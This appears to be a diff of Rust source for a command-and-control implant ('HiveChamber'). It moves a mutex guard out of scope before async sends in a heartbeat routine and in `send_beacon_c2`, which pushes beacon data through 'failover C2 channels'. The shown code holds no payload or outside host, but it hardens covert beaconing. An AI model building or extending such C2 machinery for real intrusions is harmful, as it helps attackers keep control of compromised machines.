@@ -268,12 +268,19 @@ impl HiveChamber {
             self.identity.id(), self.role(), now
         );
 
-        // Send via FailoverDirector
+        // Send via FailoverDirector.
+        // The director is taken out of the Option so the std::sync::Mutex
+        // guard is dropped BEFORE any await point: holding a non-async
+        // MutexGuard across `.await` risks a deadlock and a `!Send` future.
         let sent_via_failover = {
-            let mut guard = self.ensure_failover();
-            if let Some(ref mut director) = *guard {
+            let director = {
+                let mut guard = self.ensure_failover();
+                guard.take()
+            };
+            if let Some(mut director) = director {
                 let results = director.send_with_failover(beacon.as_bytes()).await;
                 let success = results.iter().any(|r| r.success);
+                *self.failover.lock().unwrap() = Some(director);
                 if success {
                     info!("SMOKE: heartbeat sent via failover director");
                 } else {
@@ -572,10 +579,15 @@ impl HiveChamber {
 
     /// Send an arbitrary beacon payload through the failover C2 channels.
     pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
-        let mut guard = self.ensure_failover();
-        if let Some(ref mut director) = *guard {
+        // Take the director out so the MutexGuard is dropped before the await.
+        let director = {
+            let mut guard = self.ensure_failover();
+            guard.take()
+        };
+        if let Some(mut director) = director {
             let results = director.send_with_failover(data).await;
             let success = results.iter().any(|r| r.success);
+            *self.failover.lock().unwrap() = Some(director);
             if success {
                 info!("C2: beacon delivered via failover ({} channels tried)", results.len());
             } else {
